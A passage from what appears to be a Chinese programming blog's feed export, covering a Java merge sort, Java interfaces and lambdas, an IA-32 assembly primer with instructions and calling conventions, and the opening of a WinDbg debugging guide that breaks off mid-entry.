&#123; private static Comparable[] aux; public static void sort(Comparable[] a) &#123; aux = new Comparable[a.length]; sort(a, 0, a.length - 1); &#125; private static void sort(Comparable[] a, int l, int r) &#123; if (r &lt;= l) return; int mid = l + (r - l) / 2; sort(a, l, mid); sort(a, mid + 1, r); merge(a, l, mid, r); &#125; public static void merge(Comparable[] a, int l, int mid, int r) &#123; int i = l, j = mid + 1; for (int k = l;k &lt;= r;k++) &#123; aux[k] = a[k]; &#125; for (int k = l;k &lt;= r;k++) &#123; if (i &gt; mid) a[k] = aux[j++]; else if (j &gt; r) a[k] = aux[i++]; else if (less(aux[j], aux[i])) a[k] = aux[j++]; else a[k] = aux[i++]; &#125; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>算法模型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-java-接口与lambda表达式]]></title>
    <url>%2Fposts%2F3f2ae5f0%2F</url>
    <content type="text"><![CDATA[接口在Java中接口是对类的一组需求描述.如果类遵从某个特定接口,就履行这项服务. 接口中所有方法自动属于public,且可以被扩展. 接口有除函数原型外对方法作用的要求. 接口不能有实例域,但可以有常量(接口的域自动设为public static final).在Java SE 8前不能在接口中实现方法,之后可以实现静态方法(实际使用中常用伴随类代替). 接口不能实例化,但是可以声明变量,同时可以用instanceof检测一个对象是否实现了某个接口. 接口的定义. 123public interface Comparable&lt;T&gt; &#123; int compareTo(T other);&#125; 接口的默认实现. 1234public interface Comparable&lt;T&gt; &#123; default int compareTo(T other) &#123; /* code */ &#125; //必要的关键字default&#125; 类实现接口(实现时必须把方法显式声明为public),一个类可以实现多个接口,用逗号,分隔. 12345Class MyTest implements Comparable&lt;MyTest&gt; &#123; public int compareTo(MyTest other) &#123; //code &#125;&#125; 如果接口的默认方法与超类或另一个接口中定义的方法冲突,按照以下规则处理. 超类优先. 接口冲突(至少一个接口提供了默认实现,就会发生冲突)则必须覆盖方法. 示例Cloneable接口,该接口的默认实现为浅拷贝,有时候程序的情景需要深拷贝. 12345678class MyTest implements Cloneable &#123; public MyTest clone() throws CloneNotSupportedException &#123; MyTest cloned = (MyTest) super.clone(); cloned.day = (Date) day.clone(); return cloned; &#125;&#125; lambda表达式lambda表达式是一个可传递的代码块和必须传入代码的变量(就像参数)规范,可供之后执行.lambda表达式无需指定返回类型,lambda表达式的返回类型总是会由上下文推导得出(所以要合理返回). 123456(String first, String second) -&gt; first.length() - second.length()//等同于(first, second) -&gt; first.length() - second.length()() -&gt; &#123; System.out.println("hello"); &#125;//即使没有参数仍然要提供空括号event -&gt; System.out.println(event);//如果可以推导出参数类型,则可以忽略参数类型,且如果此时只有一个参数,可以省略小括号 lambda表达式与接口兼容,对于只有一个抽象方法的接口,需要该接口的对象时可以提供一个lambda表达式,这种接口称为函数式接口.或者可以直接方法引用代替. 12Timer t = new Timer(1000, System.out::println);//System.out::println等价于x -&gt; System.out.println(x) 构造器引用与方法引用类似,只不过方法名为new,例如:Person::new,Person[]::new. lambda表达式包括三个部分:一个代码块,参数,自由变量的值(非参数而且不在代码中定义的最终变量,即初始化后不会再赋值),表示lambda表达式得数据结构必须存储自由变量的值.这种代码块存储自由变量的值的情况叫做闭包. lambda表达式的体与嵌套块有相同的作用域,所以不能定义同名的变量.lambda表达式中的this关键字是指创建这个lambda表达式的方法的this参数. 内部类内部类是定义在另一个类中的类,内部类方法可以访问该类定义所在的作用域中的数据,包括私有数据;内部类对同一个包的其他类是不可见的.非static内部类的对象有一个隐式引用,其引用了实例化该内部对象的外围类对象(与C++中嵌套类的主要区别). 内部类是一种编译器现象,与虚拟机无关,编译器会将内部类翻译成:外部类名$内部类名.类似于方法重载的本质. Java还支持在方法中定义局部内部类,其作用域为当前块.同时局部内部类还可以访问当前块的final局部变量,其原理是局部内部类会在局部变量释放前将其备份一次. Java还支持匿名内部类,匿名内部类没有类名,所以不能有构造器,如果构造参数的小括号后跟一个大括号,正在定义的就是匿名内部类. Java还支持静态内部类,只有内部类可以声明为static,静态内部类除了没有对外围类的引用权外与其他内部类一样.]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-assembly-IA32-基础]]></title>
    <url>%2Fposts%2F2db7688d%2F</url>
    <content type="text"><![CDATA[IA-32简介IA-32是Intel研发的一种CPU架构.包括Intel 80386/80486,Intel Pentium,Intel Xeon,Intel Core. 汇编语言与机器语言之间是一一对应的,不同的CPU支持的机器指令也是不一样的,一种CPU能执行的全局机器指令集合就是该CPU的指令集.CPU顺序的执行机器指令,访问存储器获取数据,同时有若干寄存器存放临时数据. 工作方式IA-32系列CPU有三种工作方式:保护方式,实地址方式和系统管理方式;保护方式有一种子工作方式,虚拟8086方式.IA-32支持8/16/32位的操作数,同时支持16/32位的存储器寻址方式. 为了兼容,IA-32系列CPU支持两种段模式,32位段模式和16位段模式.32位段模式默认操作数尺寸为8/32位,默认存储器寻址方式为32位,16位段模式默认操作数尺寸为8/16位,默认存储器寻址方式为16位.保护方式下一般采用32位段模式,实方式下只能使用16位段模式. 保护方式保护方式是IA-32系列CPU的常态工作方式. 在保护方式下,全部32根地址线有效,可寻址2 ^ 32 BYTE(4GB)的物理地址空间;支持扩充的存储器分段管理和可选的存储器分页管理基址,为实现虚拟内存空间提供了硬件支持;支持4个特权级,实施特权检查,这是支持操作系统实现多任务管理的基础,能够精确地控制对存储器的访问和有效的控制对指令的执行. 保护方式下还支持虚拟8086方式(保护方式运行的多任务可以是不同的运行方式),可以在多任务环境下运行基于Intel 8086/8088处理器的程序. 实地址方式实地址方式下CPU只能访问00000H~FFFFFH的地址空间(继承自8086/8088处理器,只有20根地址线),且只支持分段管理,每个段的大小为64KB,不支持分页存储管理机制,因为实地址方式下访问的是真实的物理地址. 在开机或重设系统后IA-32系列CPU就处于实地址方式.在完成初始化工作和进入保护方式的准备后就会切换到保护方式. 实地址方式可以访问8个32位通用寄存器,但EIP,ESP,EFLAGS都只有低16位(FLAGS)起作用.实地址方式下处理器的基本执行环境和基本指令集与保护方式是相同的.不过间接寻址中不能使用比例因子. 系统管理模式SMM(system management mode),源于Intel 386 SL处理器,SMM模式是IA-32处理器的标准特性.为操作系统和系统管理软件提供了一种透明的机制,用于实现电源管理和OEM厂商特有的特性. 通过激活外部系统中断引脚(SMI#),产生系统管理中断SMI,由此可以进入SMM模式.在进入SMM时,处理器切换到单独的地址空间,同时会保存当前运行的程序/任务的环境上下文.这样SMM专用的代码可以透明地执行(即操作系统/应用程序不受SMM模式的代码影响).当退出SMM模式后,处理器被置于SMI之前的状态,继续执行被中断的程序/任务. 切换工作方式 在加电冷启动,或者重置reset后,处理器处于实地址方式. CR0寄存器的PE标志位用于控制处理器在实模式与保护模式之间的切换.EFLAGS标志寄存器的VM标志位用于控制处理器在虚拟8086模式与保护模式之间的切换.这两种模式的转换通常是随着任务切换或中断/异常处理返回实现的. 无论何时接收到SMI中断且无论处理器处于何种工作方式,处理器都会切换进入SMM模式,当执行RSM(SMM返回)指令后,处理器会切换回SMI发生时的工作方式. 寄存器IA-32系列CPU有多种寄存器.除了通用寄存器,专用寄存器(EIP,EFLAGS)和段寄存器统称为定点寄存器组,除此之外还有浮点寄存器栈和多媒体扩展寄存器组. 通用寄存器IA-32系列CPU有8个32bit通用寄存器,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,它们的低16位是8个16位的通用寄存器,名称沿用以前的AX,BX,CX,DX,SP,BP,SI,其中AX,BX,CX,DX的高八位和低八位又分为*H/L.这些都是Intel系列向前兼容的风格(Intel 80386前的CPU最多允许16位操作数). 这些寄存器除了通用功能外还有各自的特殊用途,累加器EAX,基地址寄存器EBX,计数寄存器ECX,数据寄存器EDX,源变址寄存器ESI,目的变址寄存器EDI,基指针寄存器EBP,堆栈指针寄存器ESP(ESP只做此用途). 标志寄存器IA-32系列CPU有一个32位的标志寄存器(EFLAGS Register),其含有一组状态标志,一组系统标志和一个控制标志. EFLAGS的状态标志位(0,2,4,6,7,11)指示算术指令(如add,sub,mul等指令)的结果. CF(bit 0):无符号数最高位进位或借位置1,否则置0.称为进位标志,检测无符号操作的溢出,比较无符号数大小,还可以配合移位指令. ZF(bit 6):结果为0置1,否则置0.称为零标志,检测结果是否为0. SF(bit 7):带符号数的符号位.称为符号标志,其值为运算结果的最高位,检测结果是否为负数. OF(bit 11):带符号数溢出置1,否则置0.溢出标志,检测补码溢出. PF(bit 2):反应运算结果最低字节为1的位数,偶数个1置1,否则置0.用于串行通信的奇偶校验. AF(bit 4):反应运算结果第3位是否发生进位/借位或低4位是否有进位/借位,是置1,否则置0.被BCD(binary-code decimal)算术运算使用. EFLAGS的控制标志位. DF(bit 10):控制串指令(MOVS,CMPS,SCAS,LODS以及STOS).设置DF标志使得串指令自动递减,清除该标志则使得串指令自动递增.STD以及CLD指令分别用于设置以及清除DF标志. EFLAGS的系统标志以及IOPL域用于控制操作系统或是执行操作,不允许被应用程序所修改. TF(bit 8):置1以允许单步调试模式,置0则禁用. IF(bit 9):置1以响应可屏蔽中断,置0则禁用. IOPL(bits 12 and 13):指示当前运行任务的I/O特权级(I/O privilege level).(正在运行任务的当前特权级(CPL)必须小于或等于I/O特权级才能允许访问I/O地址空间.只能在CPL为0时才能通过POPF以及IRET指令修改) NT(bit 14):控制中断链和被调用任务.当前任务与前一执行任务相关则置1,否则置0. RF(bit 16):控制处理器对调试异常的响应. VM(bit 17):置1以允许虚拟8086模式,置0则返回保护模式. AC(bit 18):标志及在CR0寄存器中的AM位置都为1时才允许内存引用的对齐检查. VIF(bit 19):IF标志的虚拟镜像(Virtual image),与VIP标志结合起来使用.使用该标志及VIP标志,并设置CR4控制寄存器的VME标志就可以允许虚拟模式扩展(virtual mode extensions). VIP(bit 20):置1以指示一个中断正在被挂起,当没有中断挂起时该位置0.与VIF标志结合使用. ID(bit 21):设置或清除这个标志指示处理器对CPUID指令的支持. 段寄存器IA-32系列CPU有一组段寄存器,支持以分段方式管理存储器.分段存储管理方式中程序使用中的存储单元总会属于某个段,所以可以使用某段某单元对存储单元进行顶为定位,其形式为段号:偏移,也称为逻辑地址. 对于实地址方式和保护方式来说段号是不一样的,实地址方式段号是段值,而保护模式段号是段选择子. 它们都会从段号获取段起始地址,与偏移相加后就得到了实际的物理地址.在保护方式下物理地址为32位,段起始地址和偏移都为32位,而实地址方式下物理地址20位,段起始地址20位,偏移则是16位. 逻辑地址中当前使用段的段号存放在段寄存器中,早期Intel 8086有四个段寄存器:CS(代码段寄存器),SS(堆栈段寄存器),DS(数据段寄存器),ES(附加段寄存器),从Intel 80386开始新增了两个附加段寄存器:FS,GS,沿用至今.这6个段寄存器可见部分的长度都是16位,实地址方式下存放16位的段值,保护方式下存放16位的段选择子. 简单使用:MOV DL, [ES : EBX],MOV DL, [ES : BX](实模式). 不能显式地改变CS段寄存器,也不能把立即数直接传送到段寄存器中. 指令指针寄存器IA-32系列CPU有一个32位的指令指针寄存器EIP,CPU通过CS和EIP确定所取指令的存储单元位置.CPU通过增加EIP以当前指令长度的值来顺序的执行程序,通过修改EIP可以控制程序的执行,完成跳转. 数据计算机系统数据存储的最小单位为bit,一个bit只有两种状态,0和1.所以计算机中的机器指令和数据都采用二进制编码. 对于有符号数,现在的计算机系统都使用补码表示,正数的补码同二进制表示,而负数的补码就是其相反数(正数)的二进制形式取反加一,而对应的数据扩展也就是符号位扩展(保证代表的数值不变). ASCII码是国际较通用的字符二进制编码,属于7位二进制编码.此外还有GB2313等字符编码,本质上都是数映射字符集. 基本数据类型:字节(8bit),字(两个字节),双字,四字,十字节,字符串. 数据和代码以二进制编码形式储存在存储器或内存中. 内存由基本存储单元线性组成,一个基本存储单元由8个连续的位组成(也就是一个字节),每个字节有一个唯一的地址,存储着一字节的数据(就像一个char变量).IA-32使用小端法存储数据(高位高地址,低位低地址). 汇编指令CPU能直接识别并执行的指令就是机器指令,机器指令采用二进制编码,一般由操作码和操作数组成. 机器指令虽然对于CPU来说很容易识别,但对于人类来说非常难以理解,所以有了更利于阅读的汇编语言,用助记符代替了01序列.汇编语言需要被汇编器编译成机器指令才能被CPU执行. 汇编语言的指令格式. 1[标识符:] [指令助记符] [操作数表] [;注释] 只有指令助记符是必须的,操作数表依指令助记符而定.默认情况操作数可以是通用寄存器,存储单元或立即数. 如果存储器操作数长度不定(也就是两个都是存储器操作数),需要使用MOV BYTE/WORD/DWORD/QWORD PTR DEST,SRC(或MOV DEST,BYTE/WORD/DWORD/QWORD PTR SRC). 同时有些汇编器支持FAR,NEAR来说明标号的类型(远近). IA-32系列CPU通用指令基本编码格式如下. 传送指令123456MOV DEST,SRC#即赋值操作,DEST&lt;=SRC,两个操作数长度需一致,DEST必须是通用寄存器或存储单元.XCHG OPRD1,OPRD2#将两个操作数的内容交换,两个操作数长度需一致,DEST,SRC必须是通用寄存器或存储单元且至少有一个通用寄存器.LEA REG,OPRD#REG&lt;=&amp;OPRD,将操作数OPRD的有效地址传送到操作数REG,OPRD必须为存储器操作数,REG必须是一个16位或32位的通用寄存器,且不影响各标志位. 加减指令123456789101112131415ADD DEST,SRC#DEST&lt;=DEST+SRC,将两个操作数内容相加并赋值给DEST,DEST必须是通用寄存器或存储单元.SUB DEST,SRC#DEST&lt;=DEST-SRC,用DEST内容减SRC内容并赋值给DEST,DEST必须是通用寄存器或存储单元.INC DEST#DEST&lt;=DEST+1,DEST必须是通用寄存器或存储单元.DEC DEST#DEST&lt;=DEST-1,DEST必须是通用寄存器或存储单元.NEG DEST#DEST&lt;=0-DEST,对操作数取补,,DEST必须是通用寄存器或存储单元.ADC DEST,SRC#DEST&lt;=DEST+SRC+CFSBB DEST,SRC#DEST&lt;=DEST-(SRC+CF) 乘除指令123456789101112131415161718192021222324252627282930313233#无符号数乘法指令MUL OPRD#TYPE OPRD == BYTE -&gt; AX&lt;=OPRD*AL#TYPE OPRD == WORD -&gt; DX:AX&lt;=OPRD*AX#TYPE OPRD == DWORD -&gt; EDX:EAX&lt;=OPRD*EAX#OPRD不能是立即数#有符号数乘法指令IMUL OPRD#除了将操作数当作有符号数外与MUL一样IMUL DEST, SRC#DEST&lt;=DEST*SRC,目的操作数DEST只能是16位或者32位通用寄存器.SRC无限制,但要求数据长度与DEST一致,为立即数的话只要长度不大于DEST数据长度即可IMUL DEST, SRC1, SRC2#DEST&lt;=SRC1*SRC2,目的操作数DEST只能是16位或者32位通用寄存器.SRC1可以是通用寄存器或存储单元,数据长度与DEST一致.SRC2只能是立即数,同样有大小限制#有符号数乘法指令后两种操作可能有溢出现象,处理方式为截去高位.#溢出会导致CF,OF为1(包括单操作数时高半部分有有效位).#无论操作数是不是有符号数,乘积的低位是相同的,所以无符号乘法指令没有双操作数和三操作数形式.#无符号数除法指令DIV OPRD#TYPE OPRD == BYTE -&gt; AL&lt;=AX/OPRD,余数AH#TYPE OPRD == WORD -&gt; AX&lt;=DX:AX/OPRD,余数DX#TYPE OPRD == DWORD -&gt; EAX&lt;=EDX:EAX/OPRD,余数EDX#OPRD不能是立即数#有符号数除法指令IDIV OPRD#同上,只不过为有符号数.#如果不能整除,余数符号与被除数一致,余数绝对值小于除数的绝对值#除数为0,商太大或太小都会引起除法出错导致异常#除法指令对状态标志的影响无定义 逻辑运算指令IA-32逻辑运算指令有NOT,AND,OR,XOR和测试指令TEST,除了NOT外均有两个操作数.下面是它们的通用说明. DEST可以为通用寄存器或存储单元. 只有一个操作数的话该操作数同时是源和目的操作数. 两个操作数最多一个是存储单元. 操作数可以是字节,字,双字,但是两个操作数数据长度必须一致. 12345678NOT OPRD#OPRD&lt;=~OPRD,对标志位无影响AND DEST, SRC#OPRD&lt;=DEST&amp;SRC,CF=0,OF=0,PF,ZF,SF反映运算结果OR DEST, SRC#OPRD&lt;=DEST|SRC,CF=0,OF=0,PF,ZF,SF反映运算结果XOR DEST, SRC#OPRD&lt;=DEST^SRC,CF=0,OF=0,PF,ZF,SF反映运算结果 移位指令1234567891011121314151617181920#一般移位指令SAL/SHL OPRD, count#算术左移指令和逻辑左移指令,效果相同,且是同一条机器指令.OPRD可以为寄存器或存储单元,count可以为8位立即数或寄存器CL(表示取CL低5位)#左移count位,右边补0,移出的最高位进入CFSAR OPRD, count#算术右移指令,右移count位,左边补符号位,移出的最低位进入CFSHR OPRD, count#逻辑右移指令,右移count位,左边补0,移出的最低位进入CF#循环移位指令ROL/ROR OPRD, count#左/右循环移位指令,移出位作为填充,同时进入CFRCL/RCR OPRD, count#带进位左/右循环移位指令,移出位进入CF,CF作为填充#双精度移位指令SHLD/SHRD OPRD1, OPRD2, count#OPRD1可以为寄存器或存储单元,OPRD2只能是寄存器,且数据长度需与OPRD1一致.#把OPRD1左/右移指定的count位,使用OPRD2高/低端的count位填充,OPRD2不变,OPRD1最后移出的位进入CF#仅仅移动一位的情况下若符号位发生变化,OF=1,否则OF=0 比较指令12345CMP DEST,SRC#相当于不改变DEST的SUB,仅影响标志位TEST DEST, SRC#与AND类似,但只影响状态标志,不改变DEST 比较指令一般配合条件转移指令使用. 循环指令12345678910LOOP LABEL#循环指令只用一个字节表示地址差,所以循环转移的范围仅为-128~+127.#保护方式下循环指令将自动以寄存器ECX作为循环计数器.#等于:DEC ECX;CMP ECX, 0;JNZ LABEL.LOOPE/LOOPZ LABEL#多一个判断,如果ECX不等于0且零标志ZF为1就转移到LABEL处,指令本身对ECX减一的操作不影响标志.LOOPNE/LOOPNZ#如果ECX不等于0且零标志ZF为0就转移到LABEL处,指令本身对ECX减一的操作不影响标志. 串操作指令在串操作指令中涉及源操作数时默认使用ESI和数据段寄存器DS;涉及目的操作数时默认使用EDI和附加段寄存器ES. 串操作指令会自动调整作为指针使用的寄存器(ESI,EDI)的值,调整的大小为字符的大小,调整的方向由DF(标志寄存器的位10)控制,为0时递增,为1时递减,下面默认DF=0. 1234567891011121314151617181920212223242526272829303132333435LODSB#MOV AL, [ESI];INC ESI;LODSW#MOV AX, [ESI];ADD ESI, 2;LODSD#MOV EAX, [ESI];ADD ESI, 4;STOSB#MOV [EDI], AL;INC EDI;STOSW#MOV [EDI], AX;ADD EDI, 2;STOSD#MOV [EDI], EAX;ADD EDI, 4;MOVSB#MOV BYTE PTR [EDI], [ESI];INC ESI;INC EDI;MOVSW#MOV WORD PTR [EDI], [ESI];ADD ESI, 2;ADD EDI, 2;MOVSD#MOV DWORD PTR [EDI], [ESI];ADD ESI, 4;ADD EDI, 4;#不影响标志SCASB#CMP AL, [EDI];INC EDI;SCASW#CMP AX, [EDI];ADD EDI, 2;SCASD#CMP EAX, [EDI];ADD EDI, 4;CMPSB#CMP BYTE PTR [ESI], [EDI];INC ESI;INC EDI;CMPSW#CMP WORD PTR [ESI], [EDI];ADD ESI, 2;ADD EDI, 2;CMPSD#CMP DWORD PTR [ESI], [EDI];ADD ESI, 4;ADD EDI, 4; 重复操作前缀1234567#串操作指令前缀REP CODE#CODE为一个串操作指令,REP重复CODE指令,每次重复判断ECX是否为0,为0结束重复,否则ECX减一,继续重复.REPE/REPZ CODE#同REP,但是判断过程多了对ZF的判断,ZF为0也结束重复.REPNZ/REPNE #同REP,但是判断过程多了对ZF的判断,ZF为1也结束重复. 位操作指令位操作指令分为位测试指令和位扫描指令. 位测试指令位测试指令中的两个操作数分别指定位串(OPRD1,16或者32位的通用寄存器/存储单元地址)和位号(OPRD2,与OPRD1大小相同的通用寄存器或者8位立即数,最后膜OPRD1的位大小). 12345678BT OPRD1, OPRD2#CF=OPRD1.bits[OPRD2]BTC OPRD1, OPRD2#CF=OPRD1.bits[OPRD2];~OPRD1.bits[OPRD2];BTR OPRD1, OPRD2#CF=OPRD1.bits[OPRD2];OPRD1.bits[OPRD2]=0;BTS OPRD1, OPRD2#CF=OPRD1.bits[OPRD2];OPRD1.bits[OPRD2]=1; 位扫描指令位扫描指令的OPRD1是16或者32位的通用寄存器,OPRD2是与OPRD1大小相同的通用寄存器或者存储单元. 12345BSF OPRD1, OPRD2#从低位向高位扫描OPRD2中第一个为1的位并将对应的位号赋值给OPRD1.BSR OPRD1, OPRD2#从高位向低位扫描OPRD2中第一个为1的位并将对应的位号赋值给OPRD1.#如果OPRD2为0,则ZF=1,OPRD1不确定.否则ZF=0. 状态标志操作指令1234567891011121314CLC#CF&lt;=0STC#CF&lt;=1CMC#CF&lt;=!CFLAHF#AH&lt;=EFLAGS低八位SAHF#EFLAGS低八位&lt;=AH,只影响对应的状态标志(SF,ZF,AF,PF,CF).CLD#DF&lt;=0STD#DF&lt;=1 转移指令转移指令不影响标志位. 还有计数器转移指令JECXZ,当ECX为0就转移. 条件设置字节指令条件设置字节指令不影响标志位. 堆栈指令堆栈是一段内存区域,以低地址为栈顶,高地址为栈底.由ESP指示偏移,SS指示区域,合指栈顶,栈底由内核变量记录. 12345678910111213PUSH SRC#将SRC操作数压入堆栈,同时ESP-=SRC的长度#等同于:MOV ESP,SRC;SUB ESP,SRC_LENPOP DEST#将栈顶的数据赋给DEST,ESP+=DEST的长度#等同于:ADD ESP,DEST_LEN;MOV DEST,ESPPUSHA#将所有16位通用寄存器的内容压入堆栈,顺序为AX,CX,DX,BX,SP,BP,SI,DI.然后SP-=16.POPA#执行PUSHA相反操作.SP+=16.PUSHAD#将所有32位通用寄存器的内容压入堆栈,顺序为EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI.然后ESP-=32.POPAD 符号扩展指令12345678910CBW#把寄存器AL的值符号扩展到AH,即用AL的符号位填充AHCWD#把寄存器AX的值符号扩展到DXCDQ#把寄存器EAX的值符号扩展到EDXCWDE#把寄存器AX的值符号扩展到EAX高半部分#都不影响状态标志 扩展传送指令12345MOVSX DEST, SRC#DEST只能时通用寄存器,SRC可以为通用寄存器或存储单元.DEST数据长度必须大于SRC,该指令将SRC符号扩展后赋值给DEST.#DEST可以为16位或32位,SRC可以为8位或16位MOVZX DEST, SRC#同上,只是SRC进行的是零扩展 过程调用指令和返回指令12345CALL OPRD#PUSH PC;EIP&lt;=OPRD;实际只比跳转多了一个返回地址压栈.RET [count]#POP EIP.#ESP&lt;=ESP+count 中断控制指令1234CLI#屏蔽中断STI#恢复中断 进行不能分离的操作比如设置栈基址SS和偏移地址SP时,需要先屏蔽中断. 寻址方式CPU常用的寻址方式可分为:立即寻址,寄存器寻址和存储器寻址.(此外还有固定寻址和I/O端口寻址) 立即寻址立即寻址即直接将操作数作为指令的一部分给出,这样的操作数也称为立即数.(只有源操作数使用立即寻址,且此时源操作数的长度由目的操作数决定) 寄存器寻址寄存器寻址即使用寄存器的内容作为操作数,在指令中将寄存器名给出. 存储器寻址存储器寻址即给出存储单元偏移从而通过偏移和段起始地址访问对应存储单元作为操作数的方式.有多种存储器寻址方式. 直接寻址:MOV EAX, [95480H]. 寄存器间接寻址:通过基址,变址,比例和位移量获取存储器单元偏移,偏移EA为:基址+变址*比例+位移量.mov EAX, [ESI + EDI * 4 + 12H].其中基址可以为所以通用寄存器,变址可以为除ESP所以通用寄存器,比例可以为1,2,4,8,位移量为一个数. 在32位的存储器寻址方式中,如果基址寄存器不是EBP或ESP,默认段寄存器为DS,是的话默认段寄存器为SS. 实地址方式存储单元的有效地址(偏移)不应该超过FFFFH,超过则会触发异常. 分支与循环分支程序一般使用cmp,test等指令判断,条件跳转指令跳转配合实现.减少转移是优化分支的方法. 循环程序与分支程序同理,只需要添加一个若不满足条件则跳回开头的指令序列即可,同时IA-32还提供了专门的循环指令loop. 过程调用C语言中的函数就是汇编语言中的子程序,也就是过程.其本质是控制流的转移(PC的改变),CPU提供专门的指令call,ret来进行过程调用与返回. 调用时将返回地址入栈(一个存储数据的区域),返回时通过返回地址返回,本质上就是数据的读写.(eax寄存器默认用于存储程序的返回值) 函数调用将栈划分为一个个栈帧,从逻辑上讲,栈帧就是一个函数执行的环境:函数参数,函数的局部变量,函数返回地址等等. ebp即帧指针,指向当前栈帧的底部,上一栈帧的顶部.esp即栈指针,指向当前栈帧的顶部(同时也是栈的顶部),下一将要插入的栈帧的底部.这两个指针的值规定了当前栈帧范围. 函数调用前首先要处理参数,x86有三种常用调用约定,cdecl(C规范),stdcall(WinAPI默认),fastcall函数调用约定.x86的Linux使用cdecl调用. cdecl:参数从右往左一次入栈,调用者实现栈平衡,返回值存放在eax中. stdcall:参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在eax中. fastcall:参数1,2分别保存在ecx,edx;剩下的参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在eax中. x86-64的Linux前六个整型参数通过寄存器传递,按顺序为:rdi,rsi,rdx,rcx,r8,r9.同时xmm0到xmm7用来放置浮点参数,其他的参数入栈(从右至左向8字节对齐). 在参数处理完后就会执行call指令,这个指令首先将返回地址放入栈中,然后跳转到函数代码执行. 被调用的函数会在开始保存ebp,赋值ebp为esp,然后对esp进行减操作来扩展栈的内存空间以容纳局部变量,此时该函数的栈帧成型. 被调用函数执行完后通过ret指令返回调用函数,ret之前会赋值esp为ebp(之前保存的),然后恢复ebp,此时栈顶为返回地址.ret通过返回地址跳转. 堆栈平衡其实就是主程序与子程序之间栈帧的切换,堆栈平衡不断复用栈的空间存储栈帧,使函数调用内存消耗变少. 123456push ebpmov ebp, espsub esp, 0x20 ;为局部变量开辟空间;...leave ;等于:mov esp, ebp;pop ebp;ret 寄存器保护由于程序运行过程中会使用到各寄存器来进行数据处理,而子程序可能会改变主程序正在使用的寄存器.这就需要进行选择,子程序和主程序谁来保护寄存器的值. 其中x86-64采用了一组统一的寄存器使用惯例,%rbx,%rbp,%r12~%r15为被调用者保存寄存器,而所有其他寄存器除了%rsp都为调用者保存寄存器. 系统调用32位Linux系统调用通过int 0x80来实现的,eax寄存器中为调用的功能号,ebx,ecx,edx,esi等寄存器则依次为参数. 该调用是从左至右依次传参,与普通函数不同.在线32位系统调用号. 64位Linux系统调用通过syscall指令进入,传参寄存器为:rdi,rsi,rdx,r10,r8和r9.rax为系统调用号. 系统调用限制最多6个参数.返回结果在rax寄存器中.在线64位系统调用号. 系统调用定义文件/usr/include/asm/unistd_32.h,/usr/include/asm/unistd_64.h,/usr/include/bits/syscall.h. 汇编指示与伪指令简介汇编指示与伪指令是汇编器提供的用于定义段名,过程名和控制一些编译选项的指令,各汇编器有所不同. MASM示例. 1234567891011121314151617181920.686p;指定处理器的型号或适用的指令集,.686p表示Pentium Pro及以上的处理器include listing.inc;包含文件listing.inc.model flat;采用平坦模式,各存储段重叠.INCLUDELIB LIBCMTD;包含导入库文件CONST SEGMENT;段CONST开始$haa DB '\n', 00H;定义变量CONST ENDS;段CONST结束PUBLIC _main;声明公用标号_mainEXTRN _printf:PROC;声明外部过程_printf_TEXT SEGMENT_var1$=-4;定义符号值,标识符_var1代表常数-4_main PROC;过程_main开始 ..._main ENDP;过程_main结束_TEXT ENDSEND;指示程序结束 NASM示例. 1234567891011121314segment text;命名段textorg 100H;段内偏移从100H开始计算,COM程序会从段内偏移100H开始执行MOV AX, CSMOV DS, AX;使数据段和代码段相同MOV DX, hello;参数[DS:DX]MOV AH, 9;调用号INT 21H;调用系统例程输出字符串MOV AH, 4CHINT 21H;调用系统例程结束程序hello db "Hello,world", 0DH, 0AH, '$']]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-tool-WinDbg]]></title>
    <url>%2Fposts%2Fb4c946d0%2F</url>
    <content type="text"><![CDATA[WinDbgWinDbg是Windows平台上的用户态和内核态调试工具支持x86,IA64,AMD64平台.官网下载即可. 调试符号WinDbg允许指定一个或多个目录来存放符号文件,并使用环境变量_NT_SYMBOL_PATH来指向这些目录.对于操作系统内部模块的符号文件,可以根据使用的模块版本访问微软提供的符号服务器. 也可以设置好符号服务器自动获取,前面设置的下载文件的储存目录为C:\Symbols,后面设置访问的url(等同于命令!symfix C:\Symbols). 调式时可以使用ld命令从符号文件目录或符号服务器加载符号,使用lm命令或Debug-&gt;Modules显示模块列表. WinDbg中对符号的表示方式为Module!Symbol,如kernel32!OpenProcess,但操作系统的内核模块是例外,统一使用nt这个模块名表示,如nt!NtOpenProcess. WinDbg提供了符号检索功能,命令格式:x [Options] Module!Symbol,检索时可以使用*,?,[],#,+等字符进行模糊匹配. 在有符号文件支持的情况下,WinDbg支持源代码调试.Ctrl + P指定源代码文件路径即可(可以指定多个路径). 调式过程WinDbg支持多种调式模式. 以打开/附加的方式调试本地应用程序. 分析Dump文件. 远程调试. 内核调试分五种:NET,USB,1394,COM和本地.前四种都是双机调试模式. 附加进程时的非入侵模式,Dump文件分析和本地内核调试都属于非实时调试模式,不能直接控制被调试目标的中断和运行,一般用来观察/修改内存数据和分析数据结构. WinDbg调试程序默认停在ntdll.dll中的系统断点处,可以在命令窗口(Alt + 1)输入:g@$exentry转到程序入口处. WinDbg控制进程功能在Debug选项卡中.下为对应的命令与快捷键. 选项卡命令 命令行命令 快捷键 功能 Go g F5 运行程序 Step Into t F8或F11 单步追踪执行,进入call Step Over p F10 单步执行,不进入call pa addr 单步到指定地址,不进入call ta addr 追踪到指定地址,进入call pc [count] 单步执行到下count个call指令调用 tc [count] 追踪执行到下count个call指令调用,遇到call进入 tb [count] 追踪执行到下count条分支指令,遇到call进入,只适用于内核调试 pt 单步执行到下一个call返回指令 tt 追踪执行到下一个call返回指令,遇到call进入 ph 单步执行到下一条分支指令 th 追踪执行到下一条分支指令,遇到call进入 wt 自动追踪函数执行过程 断点命令1234567bp[ID] [Options] Address [Passes] ["CommandString"]#设置软件断点(INT 